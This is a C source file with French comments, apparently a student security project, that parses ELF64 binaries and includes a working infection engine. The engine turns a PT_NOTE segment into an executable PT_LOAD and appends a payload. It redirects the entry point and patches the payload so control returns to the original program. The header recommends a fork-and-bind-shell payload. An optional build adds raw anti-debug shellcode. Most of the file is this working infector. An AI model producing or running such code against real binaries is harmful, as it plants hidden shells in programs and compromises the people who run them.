/*
 * elf_parser.c — Lecteur ELF64 + Moteur d'infection (Personne A)
 *
 *   CASE 1 : Conversion PT_NOTE → PT_LOAD
 *   CASE 2 : Insertion du payload + patch e_entry + retour propre
 *   CASE 3 : Protected ELF (anti-debug)  [optionnel -DPROTECTED_ELF]
 *
 * Le payload peut être :
 *   - un shellcode simple (execve /bin/sh) → pas de retour possible
 *   - un payload "fork + bind shell + retour" (recommandé)
 *
 * Le moteur patche automatiquement les placeholders 0x4141414141414141
 * du payload par l'ancienne e_entry, pour permettre le retour au
 * binaire original depuis le père du fork.
 *
 * Compilation :
 *   gcc -Wall -Wextra -o elf_parser elf_parser.c
 *   gcc -Wall -Wextra -DPROTECTED_ELF -o elf_parser_protected elf_parser.c
 *
 * Usage :
 *   ./elf_parser <fichier_elf>              → mode lecture
 *   ./elf_parser <fichier_elf> <payload>    → mode injection
 *
 * ATTENTION : en mode injection, le fichier cible est MODIFIÉ.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <elf.h>

/* ============================================================
 * PARTIE 1 — LECTURE
 * ============================================================ */

static const char *nom_type_segment(Elf64_Word type) {
    switch (type) {
        case PT_NULL:         return "NULL";
        case PT_LOAD:         return "LOAD";
        case PT_DYNAMIC:      return "DYNAMIC";
        case PT_INTERP:       return "INTERP";
        case PT_NOTE:         return "NOTE";
        case PT_SHLIB:        return "SHLIB";
        case PT_PHDR:         return "PHDR";
        case PT_TLS:          return "TLS";
        case PT_GNU_EH_FRAME: return "GNU_EH_FRAME";
        case PT_GNU_STACK:    return "GNU_STACK";
        case PT_GNU_RELRO:    return "GNU_RELRO";
        case PT_GNU_PROPERTY: return "GNU_PROPERTY";
        default:              return "AUTRE";
    }
}

static int lire_entete(FILE *f, Elf64_Ehdr *ehdr) {
    if (fseek(f, 0, SEEK_SET) != 0) { perror("fseek"); return -1; }
    if (fread(ehdr, sizeof(*ehdr), 1, f) != 1) {
        fprintf(stderr, "Erreur : fichier trop petit.\n");
        return -1;
    }
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "Erreur : pas un ELF.\n"); return -1;
    }
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64) {
        fprintf(stderr, "Erreur : pas 64 bits.\n"); return -1;
    }
    return 0;
}

static void afficher_entete(const Elf64_Ehdr *ehdr) {
    printf("== En-tete ELF ==\n");
    printf("  Type (e_type)        : %u\n", ehdr->e_type);
    printf("  Point d'entree       : 0x%lx\n", (unsigned long)ehdr->e_entry);
    printf("  Offset des phdr      : %lu\n",   (unsigned long)ehdr->e_phoff);
    printf("  Nombre de phdr       : %u\n",    ehdr->e_phnum);
    printf("  Taille d'un phdr     : %u\n\n",  ehdr->e_phentsize);
}

static int afficher_program_headers(FILE *f, const Elf64_Ehdr *ehdr) {
    if (fseek(f, ehdr->e_phoff, SEEK_SET) != 0) {
        perror("fseek(phdr)"); return -1;
    }
    printf("== Program headers (%u) ==\n", ehdr->e_phnum);
    printf("  #   Type          Offset      VirtAddr      FileSiz   Flags\n");
    for (unsigned int i = 0; i < ehdr->e_phnum; i++) {
        Elf64_Phdr phdr;
        if (fread(&phdr, sizeof(phdr), 1, f) != 1) {
            fprintf(stderr, "Erreur phdr %u.\n", i); return -1;
        }
        printf("  %-2u  %-12s  0x%08lx  0x%010lx  0x%06lx  %c%c%c\n",
               i, nom_type_segment(phdr.p_type),
               (unsigned long)phdr.p_offset, (unsigned long)phdr.p_vaddr,
               (unsigned long)phdr.p_filesz,
               (phdr.p_flags & PF_R) ? 'R' : '-',
               (phdr.p_flags & PF_W) ? 'W' : '-',
               (phdr.p_flags & PF_X) ? 'E' : '-');
    }
    return 0;
}

/* ============================================================
 * PARTIE 2 — CASE 3 : stub anti-debug
 * ============================================================ */
#ifdef PROTECTED_ELF
static const unsigned char stub_antidebug[] = {
    0x48, 0xC7, 0xC0, 0x65, 0x00, 0x00, 0x00,
    0x48, 0x31, 0xFF, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x49, 0x31, 0xD2,
    0x0F, 0x05, 0x48, 0x83, 0xF8, 0xFF, 0x75, 0x05,
    0x6A, 0x3C, 0x58, 0x0F, 0x05
};
#endif

/* ============================================================
 * PARTIE 3 — CASE 1 : PT_NOTE → PT_LOAD
 * ============================================================ */

static int trouver_pt_note(const Elf64_Ehdr *ehdr, const Elf64_Phdr *ph) {
    for (int i = 0; i < ehdr->e_phnum; i++)
        if (ph[i].p_type == PT_NOTE) return i;
    return -1;
}

static Elf64_Addr vaddr_max_load(const Elf64_Ehdr *ehdr, const Elf64_Phdr *ph) {
    Elf64_Addr max = 0;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (ph[i].p_type == PT_LOAD) {
            Elf64_Addr fin = ph[i].p_vaddr + ph[i].p_memsz;
            if (fin > max) max = fin;
        }
    }
    return max;
}

static void convertir_en_load(Elf64_Phdr *ph, int idx,
                              Elf64_Off offset, Elf64_Addr vaddr,
                              Elf64_Xword taille) {
    ph[idx].p_type   = PT_LOAD;
    ph[idx].p_flags  = PF_R | PF_X;
    ph[idx].p_offset = offset;
    ph[idx].p_vaddr  = vaddr;
    ph[idx].p_paddr  = vaddr;
    ph[idx].p_filesz = taille;
    ph[idx].p_memsz  = taille;
    ph[idx].p_align  = 0x1000;
}

/* ============================================================
 * PARTIE 4 — Patch des placeholders dans le payload
 * ============================================================
 *
 * Le payload peut contenir un placeholder 0x4141414141414141
 * (8 octets 'A') qui doit être remplacé par l'ancienne e_entry.
 * C'est ce qui permet au père (après fork) de retourner à
 * l'entry point original du binaire.
 *
 * Format du placeholder dans le shellcode :
 *   48 B8 41 41 41 41 41 41 41 41 FF E0
 *   (movabs rax, 0x4141414141414141 ; jmp rax)
 */
static int patcher_placeholders(unsigned char *payload, size_t len,
                                Elf64_Addr ancienne_entry) {
    static const unsigned char pattern[8] = {
        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41
    };
    int patches = 0;
    for (size_t i = 0; i + 8 <= len; i++) {
        if (memcmp(payload + i, pattern, 8) == 0) {
            memcpy(payload + i, &ancienne_entry, 8);
            printf("[+] Placeholder patché à l'offset %zu → 0x%lx\n",
                   i, (unsigned long)ancienne_entry);
            patches++;
            i += 7;
        }
    }
    return patches;
}

/* ============================================================
 * PARTIE 5 — Injection
 * ============================================================ */

static int injecter(const char *chemin_elf, const char *chemin_payload) {
    /* 1. Lire le payload */
    FILE *fp = fopen(chemin_payload, "rb");
    if (!fp) { perror("fopen(payload)"); return EXIT_FAILURE; }
    fseek(fp, 0, SEEK_END);
    long pl_taille = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char *pl = malloc(pl_taille);
    if (!pl) { perror("malloc"); fclose(fp); return EXIT_FAILURE; }
    if (fread(pl, 1, pl_taille, fp) != (size_t)pl_taille) {
        perror("fread(payload)"); return EXIT_FAILURE;
    }
    fclose(fp);

    /* 2. Ouvrir l'ELF en lecture/écriture */
    FILE *f = fopen(chemin_elf, "r+b");
    if (!f) { perror("fopen(elf)"); return EXIT_FAILURE; }

    /* 3. Lire l'en-tête */
    Elf64_Ehdr ehdr;
    if (fread(&ehdr, sizeof(ehdr), 1, f) != 1) {
        perror("fread(Ehdr)"); return EXIT_FAILURE;
    }
    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "Pas un ELF.\n"); return EXIT_FAILURE;
    }
    if (ehdr.e_ident[EI_CLASS] != ELFCLASS64 ||
        ehdr.e_ident[EI_DATA]  != ELFDATA2LSB) {
        fprintf(stderr, "ELF64 LE requis.\n"); return EXIT_FAILURE;
    }

    /* 4. Lire les program headers */
    Elf64_Phdr *ph = malloc(ehdr.e_phnum * sizeof(Elf64_Phdr));
    if (!ph) { perror("malloc(phdr)"); return EXIT_FAILURE; }
    fseek(f, ehdr.e_phoff, SEEK_SET);
    fread(ph, sizeof(Elf64_Phdr), ehdr.e_phnum, f);

    /* ========== CASE 1 : PT_NOTE → PT_LOAD ========== */
    int idx = trouver_pt_note(&ehdr, ph);
    if (idx < 0) {
        fprintf(stderr, "Aucun PT_NOTE dans ce binaire.\n");
        free(ph); free(pl); fclose(f);
        return EXIT_FAILURE;
    }
    printf("[+] PT_NOTE trouvé à l'index %d\n", idx);

    fseek(f, 0, SEEK_END);
    long fin_fichier = ftell(f);
    long new_offset  = (fin_fichier + 0xFFF) & ~0xFFFL;

    Elf64_Addr vaddr = (vaddr_max_load(&ehdr, ph) + 0xFFF) & ~0xFFFULL;
    vaddr += 0x1000;

    /* ========== CASE 2 : préparation du payload ========== */

    /* 2a. Patch des placeholders (retour e_entry) */
    Elf64_Addr ancienne_entry = ehdr.e_entry;
    int patches = patcher_placeholders(pl, pl_taille, ancienne_entry);
    if (patches > 0) {
        printf("[+] %d placeholder(s) patché(s) avec e_entry=0x%lx\n",
               patches, (unsigned long)ancienne_entry);
    } else {
        printf("[!] Aucun placeholder trouvé (payload sans retour e_entry)\n");
    }

    /* 2b. Optionnel : préfixer par le stub anti-debug */
    unsigned char *payload_final = pl;
    size_t payload_len = pl_taille;

#ifdef PROTECTED_ELF
    size_t total = sizeof(stub_antidebug) + pl_taille;
    unsigned char *pp = malloc(total);
    if (!pp) { perror("malloc"); return EXIT_FAILURE; }
    memcpy(pp, stub_antidebug, sizeof(stub_antidebug));
    memcpy(pp + sizeof(stub_antidebug), pl, pl_taille);
    payload_final = pp;
    payload_len = total;
    free(pl);
#endif

    /* 5. Convertir le PT_NOTE */
    convertir_en_load(ph, idx, new_offset, vaddr, payload_len);

    /* 6. Rediriger e_entry vers notre payload */
    ehdr.e_entry = vaddr;

    /* 7. Réécrire l'en-tête */
    fseek(f, 0, SEEK_SET);
    fwrite(&ehdr, sizeof(ehdr), 1, f);

    /* 8. Réécrire la table des PH */
    fseek(f, ehdr.e_phoff, SEEK_SET);
    fwrite(ph, sizeof(Elf64_Phdr), ehdr.e_phnum, f);

    /* 9. Écrire le payload à la fin */
    fseek(f, new_offset, SEEK_SET);
    for (long i = fin_fichier; i < new_offset; i++) fputc(0x90, f);
    fwrite(payload_final, 1, payload_len, f);

    printf("[+] PT_NOTE (idx=%d) converti en PT_LOAD\n", idx);
    printf("[+] vaddr=0x%lx  offset=0x%lx  taille=%zu\n",
           (unsigned long)vaddr, (unsigned long)new_offset, payload_len);
    printf("[+] e_entry : 0x%lx → 0x%lx\n",
           (unsigned long)ancienne_entry, (unsigned long)ehdr.e_entry);
#ifdef PROTECTED_ELF
    printf("[+] Protected ELF : anti-debug activé\n");
#endif
    printf("[+] Terminé.\n");

    free(payload_final); free(ph); fclose(f);
    return EXIT_SUCCESS;
}

/* ============================================================
 * MAIN
 * ============================================================ */
int main(int argc, char *argv[]) {
    if (argc < 2 || argc > 3) {
        fprintf(stderr,
                "Usage :\n"
                "  %s <fichier_elf>              (lecture seule)\n"
                "  %s <fichier_elf> <payload>    (injection)\n",
                argv[0], argv[0]);
        return EXIT_FAILURE;
    }

    if (argc == 3)
        return injecter(argv[1], argv[2]);

    /* Mode lecture */
    FILE *f = fopen(argv[1], "rb");
    if (f == NULL) { perror("fopen"); return EXIT_FAILURE; }

    Elf64_Ehdr ehdr;
    int code = EXIT_SUCCESS;
    if (lire_entete(f, &ehdr) != 0) { code = EXIT_FAILURE; goto fin; }
    afficher_entete(&ehdr);
    if (afficher_program_headers(f, &ehdr) != 0) { code = EXIT_FAILURE; }

fin:
    fclose(f);
    return code;
}
